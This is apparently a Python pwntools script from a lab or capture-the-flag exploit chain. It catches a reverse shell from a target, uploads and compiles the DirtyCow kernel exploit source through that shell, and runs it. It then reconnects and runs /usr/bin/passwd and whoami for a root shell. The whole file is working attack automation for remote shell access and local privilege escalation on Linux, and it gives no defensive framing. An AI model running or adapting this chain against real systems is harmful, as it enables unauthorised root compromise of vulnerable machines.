#! /usr/bin/env python3
from pwn import *
import time
import subprocess
import os

# Listen the reverse shell
l = listen(1234)
# Launch the reverse shell in background
p = subprocess.Popen(["python3", os.path.dirname(os.path.abspath(__file__))+"/../reverse_shell_inject.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
l.wait_for_connection()
# Send dirty cow exploit code
with open(os.path.dirname(os.path.abspath(__file__))+'/c0w.c', 'r') as file:
    content = file.read()
    l.sendline("cat > c0w.c << EOF")
    l.sendline(content.replace('`', '\`'))
    l.sendline("EOF")
    file.close()

# Compile the exploit
l.sendline("gcc c0w.c -o c0w -pthread -lcrypt")
l.sendline("./c0w")
p = log.progress('Waiting 30 seconds for DirtyCow ...')
time.sleep(30)
p.success('DirtyCow OK')
l.close()

# Listen the reverse shell
l = listen(1234)
# Launch the reverse shell in background
p = subprocess.Popen(["python3", os.path.dirname(os.path.abspath(__file__))+"/../reverse_shell_inject.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
l.wait_for_connection()

l.sendline("/usr/bin/passwd")
l.sendline("whoami")
l.interactive()
